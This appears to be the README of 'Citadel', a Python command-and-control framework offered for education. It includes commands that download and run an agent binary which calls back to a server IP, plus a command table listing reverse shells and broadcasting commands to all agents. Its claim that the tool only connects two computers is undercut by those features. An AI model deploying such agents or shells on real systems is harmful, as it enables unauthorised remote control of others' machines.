![Citadel Screenshot](/images/citadel_screenshot.png)

# Citadel C2 Framework

Citadel is a C2 Framework built in python for purely educational purpose. It's litteraly just doesn't do anything other than create connection between two computers.

## Quick Start

### Server Installation

```bash
# Clone repository
git clone https://github.com/johntad110/citadel-c2.git
cd citadel-c2

# Install dependencies
pip install -r requirements.txt

# Start server
python main.py --host 0.0.0.0 --port 8886
```

### Agent Deployment

```powershell
# Windows (PowerShell)
Invoke-WebRequest -Uri "https://github.com/johntad110/citadel-c2/releases/latest/download/phantom_windows.exe" -OutFile phantom.exe
./phantom.exe --c2-host YOUR_SERVER_IP --c2-port 8886
```

```bash
# Linux/macOS
wget https://github.com/johntad110/citadel-c2/releases/latest/download/phantom_linux -O phantom
chmod +x phantom
./phantom --c2-host YOUR_SERVER_IP --c2-port 8886
```

## Architecture

![Citadel C2 Archtecture](/images/citadel_c2_archtecture.svg)

## Command Reference

### Server Commands

| Command           | Description                |
| ----------------- | -------------------------- |
| `list`            | Show connected agents      |
| `interact <ID>`   | Control specific agent     |
| `shell <ID>`      | Start reverse shell        |
| `broadcast <cmd>` | Send command to all agents |

### Agent Commands

| Flag        | Description                            |
| ----------- | -------------------------------------- |
| `--c2-host` | Server IP/hostname (Required)          |
| `--c2-port` | Server port (Default: 8886)            |
| `--retry`   | Connection retry attempts (Default: 5) |

## Building From Source

### Requirements

- Python 3.9+
- PyInstaller
- Colorama

```bash
# Build server
pyinstaller --onefile main.py --name citadel_server --collect-all colorama

# Build agent
pyinstaller --onefile citadel/agent/phantom.py --name phantom --collect-all citadel.protocol
```

## Security Considerations

⚠️ **Warning:** This tool is for authorized security testing and educational purposes only.

- Always use on isolated networks
- Enable firewall rules to restrict access

## License

Apache License 2.0 - See [LICENSE](LICENSE)
